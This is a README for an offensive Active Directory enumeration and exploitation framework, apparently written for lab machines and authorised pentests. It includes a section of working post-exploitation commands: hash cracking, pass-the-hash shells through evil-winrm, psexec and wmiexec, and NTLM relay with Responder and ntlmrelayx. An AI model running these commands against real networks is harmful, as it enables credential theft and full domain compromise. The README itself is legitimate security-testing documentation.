<div align="center">

<img src="https://capsule-render.vercel.app/api?type=waving&color=0:0d0d0d,40:1a0000,70:8b0000,100:ff0000&height=220&section=header&text=AD-ENUM%20v5.0&fontSize=72&fontColor=ffffff&animation=fadeIn&fontAlignY=40&desc=Ultimate%20Active%20Directory%20Enumerator%20%26%20Hash%20Extractor&descAlignY=58&descSize=18&descColor=ff8888" width="100%"/>

</div>

<div align="center">

[![Typing SVG](https://readme-typing-svg.demolab.com?font=JetBrains+Mono&weight=800&size=20&duration=2500&pause=700&color=FF3333&center=true&vCenter=true&width=650&lines=%E2%9C%A6+Automated+Active+Directory+Recon;%E2%9C%A6+AS-REP+Roasting+%26+Kerberoasting;%E2%9C%A6+DCSync+%26+Full+NTDS+Extraction;%E2%9C%A6+LAPS+%2F+gMSA+%2F+GPP+Password+Hunting;%E2%9C%A6+BloodHound+%26+ADCS+Certipy+Integration;%E2%9C%A6+Pass-the-Hash+%26+Coercion+Detection)](https://github.com/subhajit-sudo/ad-enum)

<br/>

<a href="https://github.com/subhajit-sudo/ad-enum/stargazers"><img src="https://img.shields.io/github/stars/subhajit-sudo/ad-enum?style=for-the-badge&color=ff3333&labelColor=0d0d0d&logo=github" alt="Stars"/></a>
<a href="https://github.com/subhajit-sudo/ad-enum/network/members"><img src="https://img.shields.io/github/forks/subhajit-sudo/ad-enum?style=for-the-badge&color=ff6666&labelColor=0d0d0d&logo=github" alt="Forks"/></a>
<a href="https://github.com/subhajit-sudo/ad-enum/commits/main"><img src="https://img.shields.io/github/last-commit/subhajit-sudo/ad-enum?style=for-the-badge&color=cc0000&labelColor=0d0d0d&logo=git&logoColor=white" alt="Last Commit"/></a>
<a href="https://github.com/subhajit-sudo/ad-enum/blob/main/LICENSE"><img src="https://img.shields.io/badge/License-MIT-ff4444?style=for-the-badge&labelColor=0d0d0d" alt="License"/></a>

<br/><br/>

<img src="https://img.shields.io/badge/Platform-Kali%20Linux-557C94?style=flat-square&logo=kalilinux&logoColor=white&labelColor=0d0d0d"/>
<img src="https://img.shields.io/badge/Shell-Bash%205.0+-4EAA25?style=flat-square&logo=gnubash&logoColor=white&labelColor=0d0d0d"/>
<img src="https://img.shields.io/badge/Requires-root-FF4444?style=flat-square&logo=linux&logoColor=white&labelColor=0d0d0d"/>
<img src="https://img.shields.io/badge/Version-5.0-FF0000?style=flat-square&labelColor=0d0d0d"/>
<img src="https://img.shields.io/badge/Maintained-yes-00cc44?style=flat-square&labelColor=0d0d0d"/>

</div>

---

<div align="center">

```
╔═══════════════════════════════════════════════════════════════════════╗
║   █████╗ ██████╗       ███████╗███╗   ██╗██╗   ██╗███╗   ███╗        ║
║  ██╔══██╗██╔══██╗      ██╔════╝████╗  ██║██║   ██║████╗ ████║        ║
║  ███████║██║  ██║█████╗█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║        ║
║  ██╔══██║██║  ██║╚════╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║        ║
║  ██║  ██║██████╔╝      ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║        ║
║  ╚═╝  ╚═╝╚═════╝       ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝        ║
║        Ultimate AD Enumerator & Hash Extractor  ·  v5.0              ║
║                      Optimized for Kali Linux                        ║
╚═══════════════════════════════════════════════════════════════════════╝
```

</div>

---

## 🧠 What is AD-ENUM?

**AD-ENUM v5.0** is a high-performance, fully automated Active Directory reconnaissance and exploitation framework — written entirely in Bash, built for Kali Linux.

It chains together the best open-source AD security tools into one seamless, phase-driven workflow. Starting from zero — just a target IP — it discovers the domain, enumerates every user and share, hunts for exposed credentials, launches Kerberos attacks, and can escalate all the way to a full domain compromise with NTDS extraction.

Designed with **Hack The Box**, **VulnNyx**, and real-world AD pentests in mind. No configuration files, no setup beyond installing dependencies. Just run it.

---

## ⚡ Attack Pipeline

```
                         ┌──────────────────────┐
          ─────────────► │    TARGET DC IP       │ ◄─────────────
         │               └──────────┬───────────┘               │
         │                          │                            │
         │              ┌───────────▼───────────┐               │
         │              │  PHASE 1 · NMAP SCAN  │               │
         │              │  SYN + Scripts + SMB  │               │
         │              └───────────┬───────────┘               │
         │                          │                            │
         │         ┌────────────────▼────────────────┐          │
         │         │  PHASE 2 · DOMAIN DISCOVERY      │          │
         │         │  LDAP RootDSE / DNS SRV / Hosts  │          │
         │         └────────────────┬─────────────────┘          │
         │                          │                            │
    ┌────▼──────┐         ┌─────────▼─────────┐       ┌─────────▼──────┐
    │ PHASE 3   │         │    PHASE 4        │       │   PHASE 5      │
    │ SMB ENUM  │         │  LDAP DEEP ENUM   │       │ KERBEROS ENUM  │
    │ GPP · RID │         │  Desc · LAPS ·    │       │ Kerbrute ·     │
    │ Shares    │         │  B64 · gMSA ·     │       │ Validation     │
    └─────┬─────┘         │  Delegation       │       └──────┬─────────┘
          │               └────────┬──────────┘              │
          └──────────────────┐     │      ┌──────────────────┘
                             ▼     ▼      ▼
                        ┌──────────────────────┐
                        │   PHASE 6 · ATTACKS  │
                        │  AS-REP · Kerberoast │
                        │  Spray · Auto-Crack  │
                        └──────────┬───────────┘
                                   │
               ┌───────────────────┼───────────────────┐
               ▼                   ▼                   ▼
        ┌────────────┐    ┌─────────────────┐   ┌──────────────┐
        │  PHASE 7   │    │    PHASE 8      │   │   PHASE 9/10 │
        │  DCSYNC    │    │ ADCS / Certipy  │   │ Web · WinRM  │
        │  NTDS DUMP │    │ ESC1–ESC8 Vuln  │   │ Coercion Det │
        │  PtH + BH  │    └─────────────────┘   └──────────────┘
        └────────────┘
```

---

## 🔥 Features

<table>
<tr>
<td width="50%" valign="top">

### 🔍 Reconnaissance
- `nmap` SYN scan, version detection, SMB scripts
- **SMB Signing** detection → NTLM relay identification
- DNS SRV records (Kerberos, LDAP, GC, kpasswd)
- **SNMP** community brute-force + user harvesting
- **SMTP** VRFY-based user enumeration (port 25)

### 🗝️ Credential Hunting
- **Passwords in LDAP descriptions** *(HTB: Resolute)*
- **Base64 legacy LDAP attributes** *(HTB: Cascade)*
- **GPP/cpassword decryption** *(HTB: Active)*
- **LAPS** local admin password extraction
- **gMSA** managed service account detection

### 👥 User Discovery
- RID cycling via `netexec` & `impacket-lookupsid`
- `rpcclient` enumdomusers + querydispinfo
- `enum4linux-ng`, `ldapdomaindump`
- Kerberos user validation via `kerbrute`
- LDAP attribute mining for all user objects

</td>
<td width="50%" valign="top">

### 🎫 Kerberos Attacks
- **AS-REP Roasting** — no-preauth user targeting
- **Kerberoasting** — SPN account TGS extraction
- **Kerbrute** wordlist + discovered-user validation
- **Auto-cracking** with `hashcat` + custom wordlists
- Anonymous & authenticated attack modes

### 💀 Post-Exploitation
- **DCSync** via `impacket-secretsdump`
- **NTDS.dit** full domain hash extraction
- **SAM** local account hash dump
- **VSS** backup method for stealth extraction
- **Pass-the-Hash** validation (SMB + WinRM)
- **BloodHound** automated data collection

### 🛡️ Advanced Detection
- **ADCS / Certipy** — ESC1–ESC8 vulnerability scan
- **PetitPotam** (EfsRpcOpenFileRaw) coercion check
- **PrinterBug** (MS-RPRN spooler) detection
- **WebDAV** WebClient coercion surface
- **Delegation** — Unconstrained / Constrained / RBCD
- **Shadow Credentials** (msDS-KeyCredentialLink)

</td>
</tr>
</table>

---

## 📦 Installation

```bash
# Clone the repository
git clone https://github.com/subhajit-sudo/ad-enum.git
cd ad-enum

# Make executable
chmod +x ad-enum.sh

# Install ALL dependencies automatically (Kali Linux)
sudo ./ad-enum.sh -i
```

<details>
<summary><b>📋 What gets installed?</b></summary>

<br/>

| Category | Tools |
|----------|-------|
| **Core** | `nmap`, `ldap-utils`, `smbclient`, `rpcclient` |
| **Impacket Suite** | `GetNPUsers`, `GetUserSPNs`, `secretsdump`, `lookupsid`, `psexec`, `wmiexec`, `rpcdump`, `reg`, `GetADUsers` |
| **Enumeration** | `netexec`, `kerbrute`, `enum4linux-ng`, `smbmap`, `ldapdomaindump`, `dnsenum` |
| **Exploitation** | `bloodhound-python`, `certipy-ad`, `evil-winrm`, `gpp-decrypt` |
| **Network** | `responder`, `gobuster`, `onesixtyone`, `snmpwalk`, `smtp-user-enum` |

</details>

---

## 🚀 Usage

```bash
sudo ./ad-enum.sh -t <TARGET_IP> [options]
```

| Flag | Description | Example |
|------|-------------|---------|
| `-t` | **Target** DC IP *(required)* | `-t 10.10.10.100` |
| `-u` | **Username** for auth enumeration | `-u svc_user` |
| `-p` | **Password** for auth enumeration | `-p 'P@ssword123'` |
| `-H` | **NTLM Hash** for Pass-the-Hash | `-H aad3b435:31d6cfe0` |
| `-w` | Custom **username** wordlist | `-w users.txt` |
| `-W` | Custom **password** wordlist | `-W passes.txt` |
| `-i` | **Install** all dependencies | `-i` |
| `-h` | Show **help** | `-h` |

### Examples

```bash
# Full unauthenticated recon from zero
sudo ./ad-enum.sh -t 10.10.10.100

# Authenticated — deeper enumeration (LAPS, BloodHound, ADCS)
sudo ./ad-enum.sh -t 10.10.10.100 -u svc_user -p 'Welcome123!'

# Pass-the-Hash attack chain
sudo ./ad-enum.sh -t 10.10.10.100 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0

# Custom wordlists
sudo ./ad-enum.sh -t 10.10.10.100 -w my-users.txt -W my-passwords.txt
```

---

## 📁 Output Structure

```
ad-enum-results/
└── 10.10.10.100_20241215_143022/
    ├── 📄 report.txt                ← Full scan summary + all findings
    ├── 👥 all_users.txt             ← Every discovered username
    ├── ✅ valid_users.txt           ← Kerbrute-confirmed valid users
    ├── 🔑 found_credentials.txt    ← Plaintext credentials (user:pass)
    ├── 💀 found_hashes.txt         ← All hashes (NTDS, SAM, AS-REP, TGS)
    │
    ├── nmap/                        ← Port scans & service fingerprints
    │   ├── quick.*                  ← Fast top-1000 port scan
    │   └── version.*                ← Service/script detection
    │
    ├── smb/                         ← SMB, RPC, GPP, shares
    │   ├── rid_brute.txt            ← RID cycling results
    │   ├── gpp_files/               ← Downloaded XML files
    │   └── enum4linux_stdout.txt    ← enum4linux-ng output
    │
    ├── ldap/                        ← Deep LDAP enumeration
    │   ├── users.txt                ← Users + all attributes
    │   ├── laps.txt                 ← LAPS password results
    │   ├── privileged_users.txt     ← adminCount=1 accounts
    │   └── dump/                    ← ldapdomaindump HTML files
    │
    ├── kerberos/                    ← Kerberos attacks & validation
    ├── hashes/                      ← secretsdump, SAM, NTDS, roasted hashes
    ├── passwords/                   ← Spray results & policy info
    ├── bloodhound/                  ← BloodHound zip files (ready to import)
    ├── certs/                       ← Certipy ADCS vulnerability output
    └── misc/                        ← DNS, SNMP, SMTP, FTP, coercion
```

---

## 🎯 HTB / CTF Machine Coverage

AD-ENUM automates the exact techniques used to pwn these well-known machines:

| Machine | Technique Automated |
|---------|-------------------|
| 🟩 **Resolute** | Password in LDAP description → password spray → foothold |
| 🟩 **Cascade** | Base64 legacy attribute in LDAP → credential extraction |
| 🟩 **Active** | GPP `cpassword` decryption → Kerberoast → Administrator |
| 🟩 **Forest** | AS-REP Roasting → DCSync → NTDS dump |
| 🟩 **Administrator** | Kerberoasting → cracking → Pass-the-Hash escalation |
| 🟩 **Sauna** | Username enumeration → AS-REP → secretsdump |
| 🟩 **Absolute** | AS-REP Roasting with discovered users |
| 🟩 **Sizzle** | ADCS enumeration via Certipy (ESC templates) |
| 🟩 **Intelligence** | LDAP + SMB share mining + Kerberos delegation |
| 🟩 **Monteverde** | LDAP attribute hunting + Azure AD Connect abuse |

---

## 🧩 Phase Reference

| # | Phase | Key Actions |
|---|-------|-------------|
| **1** | 🔍 NMAP | SYN scan → version scan → NSE scripts → SMB signing check |
| **2** | 🌐 Domain Discovery | LDAP RootDSE → DNS SRV → Kerberos enum → `/etc/hosts` update |
| **3** | 📂 SMB Enumeration | Shares → RID cycling → GPP decrypt → enum4linux-ng → rpcclient |
| **4** | 📚 LDAP Deep Enum | User attrs → descriptions → base64 → SPNs → LAPS → delegation → RBCD |
| **5** | 🎟️ Kerberos | Kerbrute wordlist + discovered user validation |
| **6** | 💣 Password Attacks | AS-REP Roast → Kerberoast → Spray → auto-crack (hashcat) |
| **7** | 💀 DCSync & Dump | secretsdump → NTDS → SAM → VSS → PtH validation → BloodHound |
| **8** | 📜 ADCS | Certipy vulnerable template discovery (ESC1–ESC8) |
| **9** | 🌍 Additional | Gobuster web dirs → FTP anonymous → WinRM |
| **10** | ⚡ Coercion | PetitPotam → PrinterBug → WebDAV → relay command suggestions |

---

## 🔨 Post-Exploitation Commands

After running AD-ENUM, use these commands to exploit your findings:

```bash
# Crack NTLM hashes from NTDS
hashcat -m 1000 found_hashes/secretsdump.ntds /usr/share/wordlists/rockyou.txt

# Crack AS-REP hashes
hashcat -m 18200 hashes/asrep.txt /usr/share/wordlists/rockyou.txt

# Crack Kerberoast TGS hashes
hashcat -m 13100 hashes/kerb_auth.txt /usr/share/wordlists/rockyou.txt

# Pass-the-Hash with netexec
netexec smb <TARGET> -u Administrator -H <NT_HASH>

# Shell via Evil-WinRM (Pass-the-Hash)
evil-winrm -i <TARGET> -u Administrator -H <NT_HASH>

# PSExec for SYSTEM shell
impacket-psexec DOMAIN/Administrator@<TARGET> -hashes aad3b435b51404ee:<NT_HASH>

# WMIExec for stealth
impacket-wmiexec DOMAIN/Administrator@<TARGET> -hashes aad3b435b51404ee:<NT_HASH>

# NTLM Relay Attack (if SMB signing disabled)
responder -I eth0 -d -w -v &
ntlmrelayx.py -t smb://<TARGET> -smb2support
```

---

## 📋 Requirements

| Requirement | Details |
|------------|---------|
| **OS** | Kali Linux 2023+ *(strongly recommended)* |
| **Shell** | Bash 5.0+ |
| **Python** | 3.8+ *(for Impacket, Certipy, BloodHound)* |
| **Privileges** | Must run as `root` |
| **Network** | Direct connectivity to the target DC |

---

## ⚠️ Legal Disclaimer

> **AD-ENUM is provided strictly for educational purposes and authorized penetration testing.**
>
> - Only use this tool on systems you **own** or have **explicit written permission** to test
> - Unauthorized use against any network or system is **illegal** under the CFAA, Computer Misuse Act, and equivalent laws worldwide
> - The author accepts **no responsibility** for any misuse, damage, or legal consequences arising from the use of this tool

---

## 🤝 Contributing

Contributions, bug reports, and feature requests are welcome!

1. **Fork** the repository
2. Create a feature branch: `git checkout -b feature/add-zerologon`
3. Commit your changes: `git commit -m 'feat: add ZeroLogon detection'`
4. Push: `git push origin feature/add-zerologon`
5. Open a **Pull Request**

---

<div align="center">

---

### 🌟 If this tool helped you, drop a star!

[![Star History Chart](https://api.star-history.com/svg?repos=subhajit-sudo/ad-enum&type=Date)](https://star-history.com/#subhajit-sudo/ad-enum&Date)

---

<a href="https://github.com/subhajit-sudo">
<img src="https://img.shields.io/badge/Made%20by-subhajit--sudo-FF4444?style=for-the-badge&logo=github&logoColor=white&labelColor=0d0d0d"/>
</a>

<br/><br/>

<img src="https://capsule-render.vercel.app/api?type=waving&color=0:ff0000,50:8b0000,100:0d0d0d&height=120&section=footer&animation=fadeIn" width="100%"/>

</div>
